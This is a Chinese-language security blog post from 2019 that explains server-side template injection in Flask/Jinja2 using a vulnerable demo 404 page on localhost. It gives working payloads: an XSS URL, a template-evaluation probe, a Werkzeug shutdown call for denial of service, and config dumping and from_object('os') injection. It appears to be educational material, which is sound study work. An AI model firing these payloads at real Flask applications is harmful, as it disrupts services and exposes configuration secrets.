---
layout: post
title: "SSTI的服务端模版注入"
subtitle: "Flask && Jinja2中的服务端模版注入"
date: 2019-01-12
author: ppbibo
category: security
finished: true
---
[TOC]

## Flask/Jinja2中的服务端模版注入

如果你还没听说过SSTI(服务端模版注入)，或者对其还不够了解，在此之前建议去阅读一下James Kettle写的一篇[文章](http://blog.portswigger.net/2015/08/server-side-template-injection.html)问题出在开发者定义一个404错误页面，该开发者选择使用字符串格式化将URL动态添加到模版字符串中并返回到页面中，用户对模板是可控的。



## 正文

定义一个错误页面

定义了一个模板字符串

使用格式化字符串的方式将URL动态添加到模版字符串中并返回在页面上

用户对模板是可控的

![img](/static/img/a0.png) 

![img](/static/img/a1.png) 

### 触发一个xss

```bash

http://127.0.0.1:5000/<script>alert(/xss/)</script>

```

![img](/static/img/a2.png) 

### Jinjan2 基础语法

``` 
# {% … %}     #运行Jinja2的语句；

# {{ … }}         #在页面中打印Jinja2运行的结果

# {# … #}      #注释

```



### 模版引擎成功解析

```bash

http://127.0.0.1:5000/aaa{{2+2}}

```

![img](/static/img/a3.png) 

### 鸡肋拒绝服务攻击

```Jinjan2
Flask下有一个 request 内置的全局对象

{{ request.environ['werkzeug.server.shutdown']() }}

request.environ  对象是一个与服务器环境相关的对象字典

request.environ	 字典中一个名为shutdown_server的方法名分配的键为   ['werkzeug.server.shutdown']()    关闭服务器。

[http://127.0.0.1:5000/a{](http://127.0.0.1:5000/aalert(1)){ request.environ['werkzeug.server.shutdown']() }}


```

 

### 获取配置项目信息

```
config也是Flask模版中的一个全局对象

它包含了所有应用程序的配置值

{{ config.items() }}		查看配置项目的信息 	

http://127.0.0.1:5000/a{{ config.items() }}

配置项目信息的概念：

[http://www.pythondoc.com/flask/config.html](
```

http://www.pythondoc.com/flask/config.html)

![img](/static/img/a4.png) 

![img](/static/img/a6.png) 

```python
config是一个类字典对象，它的子类包含很多方法：from_envvar, from_object, from_pyfile, root_path

Flask/config.py

def from_object(self, obj):   
```

![img](/static/img/a5.png) 

```text
B. from_object  遍历新加模块中的所有大写的变量的属性并添加属性 

C. 并且这些添加到config对象的属性都会维持他们本来的类型

D. 验证：我们将 {{ config.items() }} 注入到存在SSTI漏洞的应用中，注意当前配置条目

E. 注入  {{ config.from_object('os') }}。这会向config对象添加os库中所有大写变量的属性

F. 再次查看  {{ config.items() }}     ;    os 模块中大写变量的属性成功添加属性
```

 

 参考：

http://www.freebuf.com/articles/web/98619.html
